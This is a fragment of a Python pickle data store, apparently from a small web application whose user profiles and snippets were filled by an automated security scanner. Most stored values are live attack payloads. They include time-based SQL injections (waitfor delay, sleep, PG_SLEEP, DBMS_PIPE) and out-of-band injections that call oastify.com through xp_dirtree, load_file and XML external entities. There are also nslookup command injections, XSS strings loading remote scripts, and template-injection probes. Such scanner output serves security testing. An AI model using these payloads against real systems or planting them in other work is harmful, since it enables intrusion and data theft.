ssS"vjYTjpqN';declare @q varchar(99);set @q='\\\\3fjhzhpnjupwji6quy4r33xhz851tsjga7yylp9e.oasti'+'fy.com\\okh'; exec master.dbo.xp_dirtree @q;-- "
p688
(dp689
g4
S'True'
p690
sg6
g688
sg7
S'g8S!c8l!X0'
p691
ssS"vjYTjpqN',0)waitfor delay'0:0:20'--"
p692
(dp693
g4
S'True'
p694
sg6
g692
sg7
S'g8S!c8l!X0'
p695
ssS'/saveprofile'
p696
(dp697
g10
S'True'
p698
sg12
g696
sg13
NssS"vjYTjpqN87762680' or 5635=5635-- "
p699
(dp700
g4
S'True'
p701
sg6
g699
sg7
S'g8S!c8l!X0'
p702
ssS'ghovjnjv'
p703
(dp704
S'private_snippet'
p705
S'555'
p706
sg12
S'alesander'
p707
sS'web_site'
p708
S'http://www.example.com'
p709
sS'color'
p710
S'#ffffff'
p711
sg13
S'u]H[ww6KrA9F.x-F'
p712
sg10
S'True'
p713
sS'icon'
p714
S'1'
ssS'vjYTjpqN&nslookup -q=cname 95cnpnft90f29owwk4uxt9nnpev7jy9m4avxmlb.oastify.com.&\'\\"`0&nslookup -q=cname 95cnpnft90f29owwk4uxt9nnpev7jy9m4avxmlb.oastify.com.&`\''
p715
(dp716
g4
S'True'
p717
sg6
g715
sg7
S'g8S!c8l!X0'
p718
ssS'alesander'
p719
(dp720
g705
S'alesander'
p721
sS'name'
p722
S'alesander'
p723
sg708
S'alesander'
p724
sg710
S'alesander'
p725
sS'pw'
p726
S'(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ppxwx SYSTEM "http://iykwiw82298b2xp5ddn6migwinogcl0oofb8zx.oasti\'||\'fy.com/">%ppxwx;]>\'),\'/l\') from dual)'
p727
sS'is_author'
p728
S'True'
p729
sS'snippets'
p730
(lp731
S'825550 and 6513=65130'
p732
aS'825550 and 6513=65130'
p733
aS'500278 and 1540=1540'
p734
aS'500278 and 1540=1540'
p735
aS'796271 and 3057=3063'
p736
aS'796271 and 3057=3063'
p737
aS'492421 and 3251=03251'
p738
aS'492421 and 3251=03251'
p739
aS'80151521007866 or 4769=47690-- '
p740
aS'80151521007866 or 4769=47690-- '
p741
aS'45135542260387 or 7926=7926-- '
p742
aS'45135542260387 or 7926=7926-- '
p743
aS'89049316436442 or 5708=5712-- '
p744
aS'89049316436442 or 5708=5712-- '
p745
aS'22933893920073 or 8759=08759-- '
p746
aS'22933893920073 or 8759=08759-- '
p747
aS'73042493401105 or 5622=56220'
p748
aS'73042493401105 or 5622=56220'
p749
aS'46320995680820 or 1331=1331'
p750
aS'46320995680820 or 1331=1331'
p751
aS'33698196026219 or 2864=2867'
p752
aS'33698196026219 or 2864=2867'
p753
aS'77758981448108 or 9669=09669'
p754
aS'77758981448108 or 9669=09669'
p755
aS"673580',0)waitfor delay'0:0:20'--"
p756
aS"673580',0)waitfor delay'0:0:20'--"
p757
aS"880959,0)waitfor delay'0:0:20'--"
p758
aS"880959,0)waitfor delay'0:0:20'--"
p759
aS"317940')waitfor delay'0:0:20'--"
p760
aS"317940')waitfor delay'0:0:20'--"
p761
aS"638189)waitfor delay'0:0:20'--"
p762
aS"638189)waitfor delay'0:0:20'--"
p763
aS"606859' waitfor delay'0:0:20'--"
p764
aS"606859' waitfor delay'0:0:20'--"
p765
aS"294461 waitfor delay'0:0:20'--"
p766
aS"294461 waitfor delay'0:0:20'--"
p767
aS'290624,(select*from(select(sleep(20)))a)'
p768
aS'290624,(select*from(select(sleep(20)))a)'
p769
aS"152515' and (select*from(select(sleep(20)))a)-- "
p770
aS"152515' and (select*from(select(sleep(20)))a)-- "
p771
aS'342937 and (select*from(select(sleep(20)))a)-- '
p772
aS'342937 and (select*from(select(sleep(20)))a)-- '
p773
aS"501272'+(select*from(select(sleep(20)))a)+'"
p774
aS"501272'+(select*from(select(sleep(20)))a)+'"
p775
aS'315762+(select*from(select(sleep(20)))a)+'
p776
aS'315762+(select*from(select(sleep(20)))a)+'
p777
aS"651631'(select*from(select(sleep(20)))a)'"
p778
aS"651631'(select*from(select(sleep(20)))a)'"
p779
aS'(select*from(select(sleep(20)))a)'
p780
aS'(select*from(select(sleep(20)))a)'
p781
aS"151345''"
p782
aS"151345''"
p783
aS"434886''"
p784
aS"434886''"
p785
aS'105636'
p786
aS'105636'
p787
aS"203092'"
p788
aS"203092'"
p789
aS"661468'"
p790
aS"661468'"
p791
aS"714537'+(select load_file('\\\\\\\\jg3x0xq3kaqcky76ve574jyx0o6hulicl0cn2br.oastify.com\\\\yuu'))+'"
p792
aS"714537'+(select load_file('\\\\\\\\jg3x0xq3kaqcky76ve574jyx0o6hulicl0cn2br.oastify.com\\\\yuu'))+'"
p793
aS"(select load_file('\\\\\\\\edvsxsnyh5n7ht41s9221evsxj3crgf7hv8iy6n.oastify.com\\\\hyj'))"
p794
aS"(select load_file('\\\\\\\\edvsxsnyh5n7ht41s9221evsxj3crgf7hv8iy6n.oastify.com\\\\hyj'))"
p795
aS"192228');declare @q varchar(99);set @q='\\\\z66dqdgjaqgsaexmluvnuzodq4wxk18s1gs3ir7.oasti'+'fy.com\\jjj'; exec master.dbo.xp_dirtree @q;-- "
p796
aS"192228');declare @q varchar(99);set @q='\\\\z66dqdgjaqgsaexmluvnuzodq4wxk18s1gs3ir7.oasti'+'fy.com\\jjj'; exec master.dbo.xp_dirtree @q;-- "
p797
aS"293631);declare @q varchar(99);set @q='\\\\pf83z3p9jgpij46cuk4d3px3zu5ntrhi960tqhf.oasti'+'fy.com\\eto'; exec master.dbo.xp_dirtree @q;-- "
p798
aS"293631);declare @q varchar(99);set @q='\\\\pf83z3p9jgpij46cuk4d3px3zu5ntrhi960tqhf.oasti'+'fy.com\\eto'; exec master.dbo.xp_dirtree @q;-- "
p799
aS"920967';declare @q varchar(99);set @q='\\\\p8y3s3i9cgiic4zcnkxdwpq3suynmrai16stih7.oasti'+'fy.com\\oqi'; exec master.dbo.xp_dirtree @q;-- "
p800
aS"920967';declare @q varchar(99);set @q='\\\\p8y3s3i9cgiic4zcnkxdwpq3suynmrai16stih7.oasti'+'fy.com\\oqi'; exec master.dbo.xp_dirtree @q;-- "
p801
aS"679251;declare @q varchar(99);set @q='\\\\1dffxfnlhsnuhg4osw2p11vfx63zr3fu5iw5mtb.oasti'+'fy.com\\dke'; exec master.dbo.xp_dirtree @q;-- "
p802
aS"679251;declare @q varchar(99);set @q='\\\\1dffxfnlhsnuhg4osw2p11vfx63zr3fu5iw5mtb.oasti'+'fy.com\\dke'; exec master.dbo.xp_dirtree @q;-- "
p803
aS'465292\'||(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % tttie SYSTEM "http://0yzeie8k2r8t2fpndvnom0gei5oyc206oxbnzc.oasti\'||\'fy.com/">%tttie;]>\'),\'/l\') from dual)||\''
p804
aS'465292\'||(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % tttie SYSTEM "http://0yzeie8k2r8t2fpndvnom0gei5oyc206oxbnzc.oasti\'||\'fy.com/">%tttie;]>\'),\'/l\') from dual)||\''
p805
aS'(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % tttie SYSTEM "http://qsm4c42awh2jw5jd7lhegqa4cvio6suvim5ct1.oasti\'||\'fy.com/">%tttie;]>\'),\'/l\') from dual)'
p806
aS'(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % tttie SYSTEM "http://qsm4c42awh2jw5jd7lhegqa4cvio6suvim5ct1.oasti\'||\'fy.com/">%tttie;]>\'),\'/l\') from dual)'
p807
aS'428276'
p808
aS'428276'
p809
aS'467483'
p810
aS'467483'
p811
aS'615105'
p812
aS'615105'
p813
aS'487980'
p814
aS'487980'
p815
aS'487980'
p816
aS'487980'
p817
aS'254524'
p818
aS'254524'
p819
aS'555<script>bxfx(9264)</script>'
p820
aS'555<script>bxfx(9264)</script>'
p821
aS'555<WUKU78>3YMUD[!+!]</WUKU78>'
p822
aS'555<WUKU78>3YMUD[!+!]</WUKU78>'
p823
aS'555<ScRiPt >bxfx(9455)</ScRiPt>'
p824
aS'555<ScRiPt >bxfx(9455)</ScRiPt>'
p825
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p826
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p827
aS'dfb__${98991*97996}__::.x'
p828
aS'dfb__${98991*97996}__::.x'
p829
aS'dfb[[${98991*97996}]]xca'
p830
aS'dfb[[${98991*97996}]]xca'
p831
aS'dfb{{98991*97996}}xca'
p832
aS'dfb{{98991*97996}}xca'
p833
aS'555'
p834
aS'555'
p835
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p836
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p837
aS'555'
p838
aS'555'
p839
aS'<th:t="${dfb}#foreach'
p840
aS'<th:t="${dfb}#foreach'
p841
aS'555'
p842
aS'555'
p843
aS'<%={{={@{#{${dfb}}%>'
p844
aS'<%={{={@{#{${dfb}}%>'
p845
aS'555<img src=xyz OnErRor=0OcD(9101)>'
p846
aS'555<img src=xyz OnErRor=0OcD(9101)>'
p847
aS'bfgx4563\xc0\xbez1\xc0\xbcz2a\x90bcxhjl4563'
p848
aS'bfgx4563\xc0\xbez1\xc0\xbcz2a\x90bcxhjl4563'
p849
aS'555<img src=//xss.bxss.me/t/dot.gif onload=0OcD(9793)>'
p850
aS'555<img src=//xss.bxss.me/t/dot.gif onload=0OcD(9793)>'
p851
aS'bfg9995\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl9995'
p852
aS'bfg9995\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl9995'
p853
aS'555<body onload=0OcD(9648)>'
p854
aS'555<body onload=0OcD(9648)>'
p855
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p856
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p857
aS"555<iframe src='data:text/html"
p858
aS"555<iframe src='data:text/html"
p859
aS'dfb__${98991*97996}__::.x'
p860
aS'dfb__${98991*97996}__::.x'
p861
aS'555<isindex type=image src=1 onerror=0OcD(9574)>'
p862
aS'555<isindex type=image src=1 onerror=0OcD(9574)>'
p863
aS'dfb[[${98991*97996}]]xca'
p864
aS'dfb[[${98991*97996}]]xca'
p865
aS'555<svg\t\n\x0b\x0c\r\xa0\x00onload=0OcD(9304)'
p866
aS'555<svg\t\n\x0b\x0c\r\xa0\x00onload=0OcD(9304)'
p867
aS'dfb{{98991*97996}}xca'
p868
aS'dfb{{98991*97996}}xca'
p869
aS'555<\x00ScRiPt \r\n>0OcD(9500)</ScRiPt>'
p870
aS'555<\x00ScRiPt \r\n>0OcD(9500)</ScRiPt>'
p871
aS'555'
p872
aS'555'
p873
aS'555<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9390></ScRiPt>'
p874
aS'555<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9390></ScRiPt>'
p875
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p876
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p877
aS'555<ScRiPt \r\n>0OcD(9177)</ScRiPt>'
p878
aS'555<ScRiPt \r\n>0OcD(9177)</ScRiPt>'
p879
aS'555'
p880
aS'555'
p881
aS'555<ScR<ScRiPt>IpT>0OcD(9450)</sCr<ScRiPt>IpT>'
p882
aS'555<ScR<ScRiPt>IpT>0OcD(9450)</sCr<ScRiPt>IpT>'
p883
aS'<th:t="${dfb}#foreach'
p884
aS'<th:t="${dfb}#foreach'
p885
aS'555<script>0OcD(9322)</script>'
p886
aS'555<script>0OcD(9322)</script>'
p887
aS'555'
p888
aS'555'
p889
aS'555<WWJ1LO>7G632[!+!]</WWJ1LO>'
p890
aS'555<WWJ1LO>7G632[!+!]</WWJ1LO>'
p891
aS'<%={{={@{#{${dfb}}%>'
p892
aS'<%={{={@{#{${dfb}}%>'
p893
aS'555<ScRiPt >0OcD(9088)</ScRiPt>'
p894
aS'555<ScRiPt >0OcD(9088)</ScRiPt>'
p895
aS'bfgx6164\xc0\xbez1\xc0\xbcz2a\x90bcxhjl6164'
p896
aS'bfgx6164\xc0\xbez1\xc0\xbcz2a\x90bcxhjl6164'
p897
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p898
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p899
aS'bfg5464\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl5464'
p900
aS'bfg5464\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl5464'
p901
aS'dfb__${98991*97996}__::.x'
p902
aS'dfb__${98991*97996}__::.x'
p903
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p904
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p905
aS'dfb[[${98991*97996}]]xca'
p906
aS'dfb[[${98991*97996}]]xca'
p907
aS'dfb__${98991*97996}__::.x'
p908
aS'dfb__${98991*97996}__::.x'
p909
aS'dfb{{98991*97996}}xca'
p910
aS'dfb{{98991*97996}}xca'
p911
aS'dfb[[${98991*97996}]]xca'
p912
aS'dfb[[${98991*97996}]]xca'
p913
aS'555'
p914
aS'555'
p915
aS'dfb{{98991*97996}}xca'
p916
aS'dfb{{98991*97996}}xca'
p917
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p918
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p919
aS'555'
p920
aS'555'
p921
aS'555'
p922
aS'555'
p923
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p924
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p925
aS'<th:t="${dfb}#foreach'
p926
aS'<th:t="${dfb}#foreach'
p927
aS'555'
p928
aS'555'
p929
aS'555'
p930
aS'555'
p931
aS'<th:t="${dfb}#foreach'
p932
aS'<th:t="${dfb}#foreach'
p933
aS'<%={{={@{#{${dfb}}%>'
p934
aS'<%={{={@{#{${dfb}}%>'
p935
aS'555'
p936
aS'555'
p937
aS'bfgx10173\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10173'
p938
aS'bfgx10173\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10173'
p939
aS'<%={{={@{#{${dfb}}%>'
p940
aS'<%={{={@{#{${dfb}}%>'
p941
aS'bfg8102\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8102'
p942
aS'bfg8102\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8102'
p943
aS'bfgx5079\xc0\xbez1\xc0\xbcz2a\x90bcxhjl5079'
p944
aS'bfgx5079\xc0\xbez1\xc0\xbcz2a\x90bcxhjl5079'
p945
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p946
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p947
aS'bfg5965\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl5965'
p948
aS'bfg5965\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl5965'
p949
aS'dfb__${98991*97996}__::.x'
p950
aS'dfb__${98991*97996}__::.x'
p951
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p952
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p953
aS'dfb[[${98991*97996}]]xca'
p954
aS'dfb[[${98991*97996}]]xca'
p955
aS'dfb__${98991*97996}__::.x'
p956
aS'dfb__${98991*97996}__::.x'
p957
aS'dfb{{98991*97996}}xca'
p958
aS'dfb{{98991*97996}}xca'
p959
aS'dfb[[${98991*97996}]]xca'
p960
aS'dfb[[${98991*97996}]]xca'
p961
aS'555'
p962
aS'555'
p963
aS'dfb{{98991*97996}}xca'
p964
aS'dfb{{98991*97996}}xca'
p965
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p966
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p967
aS'555'
p968
aS'555'
p969
aS'555'
p970
aS'555'
p971
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p972
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p973
aS'<th:t="${dfb}#foreach'
p974
aS'<th:t="${dfb}#foreach'
p975
aS'555'
p976
aS'555'
p977
aS'555'
p978
aS'555'
p979
aS'<th:t="${dfb}#foreach'
p980
aS'<th:t="${dfb}#foreach'
p981
aS'<%={{={@{#{${dfb}}%>'
p982
aS'<%={{={@{#{${dfb}}%>'
p983
aS'555'
p984
aS'555'
p985
aS'bfgx10096\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10096'
p986
aS'bfgx10096\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10096'
p987
aS'<%={{={@{#{${dfb}}%>'
p988
aS'<%={{={@{#{${dfb}}%>'
p989
aS'bfg8650\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8650'
p990
aS'bfg8650\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8650'
p991
aS'bfgx5219\xc0\xbez1\xc0\xbcz2a\x90bcxhjl5219'
p992
aS'bfgx5219\xc0\xbez1\xc0\xbcz2a\x90bcxhjl5219'
p993
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p994
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p995
aS'bfg8609\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8609'
p996
aS'bfg8609\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8609'
p997
aS'dfb__${98991*97996}__::.x'
p998
aS'dfb__${98991*97996}__::.x'
p999
aS'5559046549<'
p1000
aS'5559046549<'
p1001
aS'dfb[[${98991*97996}]]xca'
p1002
aS'dfb[[${98991*97996}]]xca'
p1003
aS'dfb{{98991*97996}}xca'
p1004
aS'dfb{{98991*97996}}xca'
p1005
aS'5559046549'
p1006
aS'5559046549'
p1007
aS'555'
p1008
aS'555'
p1009
aS'\'"()&%<zzz><ScRiPt >bxfx(9598)</ScRiPt>'
p1010
aS'\'"()&%<zzz><ScRiPt >bxfx(9598)</ScRiPt>'
p1011
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1012
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1013
aS'555\'"()&%<zzz><ScRiPt >bxfx(9664)</ScRiPt>'
p1014
aS'555\'"()&%<zzz><ScRiPt >bxfx(9664)</ScRiPt>'
p1015
aS'555'
p1016
aS'555'
p1017
aS'<th:t="${dfb}#foreach'
p1018
aS'<th:t="${dfb}#foreach'
p1019
aS'555'
p1020
aS'555'
p1021
aS'<%={{={@{#{${dfb}}%>'
p1022
aS'<%={{={@{#{${dfb}}%>'
p1023
aS'bfgx10017\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10017'
p1024
aS'bfgx10017\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10017'
p1025
aS'bfg8558\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8558'
p1026
aS'bfg8558\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl8558'
p1027
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1028
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1029
aS'dfb__${98991*97996}__::.x'
p1030
aS'dfb__${98991*97996}__::.x'
p1031
aS'dfb[[${98991*97996}]]xca'
p1032
aS'dfb[[${98991*97996}]]xca'
p1033
aS'dfb{{98991*97996}}xca'
p1034
aS'dfb{{98991*97996}}xca'
p1035
aS'555'
p1036
aS'555'
p1037
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1038
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1039
aS'555'
p1040
aS'555'
p1041
aS'<th:t="${dfb}#foreach'
p1042
aS'<th:t="${dfb}#foreach'
p1043
aS'555'
p1044
aS'555'
p1045
aS'<%={{={@{#{${dfb}}%>'
p1046
aS'<%={{={@{#{${dfb}}%>'
p1047
aS'bfgx10468\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10468'
p1048
aS'bfgx10468\xc0\xbez1\xc0\xbcz2a\x90bcxhjl10468'
p1049
aS'bfg10307\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl10307'
p1050
aS'bfg10307\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl10307'
p1051
aS'5559577377<'
p1052
aS'5559577377<'
p1053
aS'5559577377'
p1054
aS'5559577377'
p1055
aS'\'"()&%<zzz><ScRiPt >0OcD(9644)</ScRiPt>'
p1056
aS'\'"()&%<zzz><ScRiPt >0OcD(9644)</ScRiPt>'
p1057
aS'555\'"()&%<zzz><ScRiPt >0OcD(9930)</ScRiPt>'
p1058
aS'555\'"()&%<zzz><ScRiPt >0OcD(9930)</ScRiPt>'
p1059
aS'555'
p1060
aS'555'
p1061
aS'555<body onload=jxmm(9264)>'
p1062
aS"555<iframe src='data:text/html"
p1063
aS'555<isindex type=image src=1 onerror=jxmm(9349)>'
p1064
aS'555<isindex type=image src=1 onerror=jxmm(9349)>'
p1065
aS'555<svg\t\n\x0b\x0c\r\xa0\x00onload=jxmm(9813)'
p1066
aS'555<svg\t\n\x0b\x0c\r\xa0\x00onload=jxmm(9813)'
p1067
aS'555<\x00ScRiPt \r\n>jxmm(9112)</ScRiPt>'
p1068
aS'555<\x00ScRiPt \r\n>jxmm(9112)</ScRiPt>'
p1069
aS'555<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9556></ScRiPt>'
p1070
aS'555<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9556></ScRiPt>'
p1071
aS'555<ScRiPt \r\n>jxmm(9261)</ScRiPt>'
p1072
aS'555<ScRiPt \r\n>jxmm(9261)</ScRiPt>'
p1073
aS'555<ScR<ScRiPt>IpT>jxmm(9776)</sCr<ScRiPt>IpT>'
p1074
aS'555<ScR<ScRiPt>IpT>jxmm(9776)</sCr<ScRiPt>IpT>'
p1075
aS'555<script>jxmm(9770)</script>'
p1076
aS'555<script>jxmm(9770)</script>'
p1077
aS'555<WRJK6R>KHGNY[!+!]</WRJK6R>'
p1078
aS'555<WRJK6R>KHGNY[!+!]</WRJK6R>'
p1079
aS'555<ScRiPt >jxmm(9986)</ScRiPt>'
p1080
aS'555<ScRiPt >jxmm(9986)</ScRiPt>'
p1081
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1082
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1083
aS'dfb__${98991*97996}__::.x'
p1084
aS'dfb__${98991*97996}__::.x'
p1085
aS'dfb[[${98991*97996}]]xca'
p1086
aS'dfb[[${98991*97996}]]xca'
p1087
aS'dfb{{98991*97996}}xca'
p1088
aS'dfb{{98991*97996}}xca'
p1089
aS'555'
p1090
aS'555'
p1091
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1092
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1093
aS'555'
p1094
aS'555'
p1095
aS'<th:t="${dfb}#foreach'
p1096
aS'<th:t="${dfb}#foreach'
p1097
aS'555'
p1098
aS'555'
p1099
aS'<%={{={@{#{${dfb}}%>'
p1100
aS'<%={{={@{#{${dfb}}%>'
p1101
aS'bfgx8305\xc0\xbez1\xc0\xbcz2a\x90bcxhjl8305'
p1102
aS'bfgx8305\xc0\xbez1\xc0\xbcz2a\x90bcxhjl8305'
p1103
aS'bfg7314\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl7314'
p1104
aS'bfg7314\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl7314'
p1105
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1106
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1107
aS'dfb__${98991*97996}__::.x'
p1108
aS'dfb__${98991*97996}__::.x'
p1109
aS'dfb[[${98991*97996}]]xca'
p1110
aS'dfb[[${98991*97996}]]xca'
p1111
aS'dfb{{98991*97996}}xca'
p1112
aS'dfb{{98991*97996}}xca'
p1113
aS'555'
p1114
aS'555'
p1115
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1116
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1117
aS'555'
p1118
aS'555'
p1119
aS'<th:t="${dfb}#foreach'
p1120
aS'<th:t="${dfb}#foreach'
p1121
aS'555'
p1122
aS'555'
p1123
aS'@@DeHF6'
p1124
aS'@@DeHF6'
p1125
aS'<%={{={@{#{${dfb}}%>'
p1126
aS'<%={{={@{#{${dfb}}%>'
p1127
aS'1\x00\xc0\xa7\xc0\xa2%2527%2522'
p1128
aS'1\x00\xc0\xa7\xc0\xa2%2527%2522'
p1129
aS'1\'"'
p1130
aS'1\'"'
p1131
aS"555'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
p1132
aS"555'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
p1133
aS'555*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)'
p1134
aS'555*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)'
p1135
aS"07BDA0Zr')) OR 76=(SELECT 76 FROM PG_SLEEP(15))--"
p1136
aS"07BDA0Zr')) OR 76=(SELECT 76 FROM PG_SLEEP(15))--"
p1137
aS"Ne3fg4r1') OR 499=(SELECT 499 FROM PG_SLEEP(15))--"
p1138
aS"Ne3fg4r1') OR 499=(SELECT 499 FROM PG_SLEEP(15))--"
p1139
aS"v1tlCzVu' OR 128=(SELECT 128 FROM PG_SLEEP(15))--"
p1140
aS"v1tlCzVu' OR 128=(SELECT 128 FROM PG_SLEEP(15))--"
p1141
aS'-1)) OR 844=(SELECT 844 FROM PG_SLEEP(15))--'
p1142
aS'-1)) OR 844=(SELECT 844 FROM PG_SLEEP(15))--'
p1143
aS'-5) OR 819=(SELECT 819 FROM PG_SLEEP(15))--'
p1144
aS'-5) OR 819=(SELECT 819 FROM PG_SLEEP(15))--'
p1145
aS'-5 OR 777=(SELECT 777 FROM PG_SLEEP(15))--'
p1146
aS'-5 OR 777=(SELECT 777 FROM PG_SLEEP(15))--'
p1147
aS"z3ZvRaqA'"
p1148
aS"z3ZvRaqA'"
p1149
aS"1 waitfor delay '0:0:15' -- "
p1150
aS"1 waitfor delay '0:0:15' -- "
p1151
aS'-1)'
p1152
aS'-1)'
p1153
aS'-1'
p1154
aS'-1'
p1155
aS'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'"+(select(0)from(select(sleep(15)))v)+"*/'
p1156
aS'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'"+(select(0)from(select(sleep(15)))v)+"*/'
p1157
aS'0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z'
p1158
aS'0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z'
p1159
aS"0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
p1160
aS"0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
p1161
aS'if(now()=sysdate(),sleep(4),0)'
p1162
aS'if(now()=sysdate(),sleep(4),0)'
p1163
aS'if(now()=sysdate(),sleep(15),0)'
p1164
aS'bfg6048\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl6048'
p1165
aS'bfg6048\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl6048'
p1166
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1167
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1168
aS'dfb__${98991*97996}__::.x'
p1169
aS'dfb__${98991*97996}__::.x'
p1170
aS'dfb{{98991*97996}}xca'
p1171
aS'dfb{{98991*97996}}xca'
p1172
aS'555'
p1173
aS'555'
p1174
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1175
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1176
aS'555'
p1177
aS'555'
p1178
aS'<th:t="${dfb}#foreach'
p1179
aS'<th:t="${dfb}#foreach'
p1180
aS'555'
p1181
aS'555'
p1182
aS'<%={{={@{#{${dfb}}%>'
p1183
aS'<%={{={@{#{${dfb}}%>'
p1184
aS'bfgx1432\xc0\xbez1\xc0\xbcz2a\x90bcxhjl1432'
p1185
aS'bfgx1432\xc0\xbez1\xc0\xbcz2a\x90bcxhjl1432'
p1186
aS'bfg10147\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl10147'
p1187
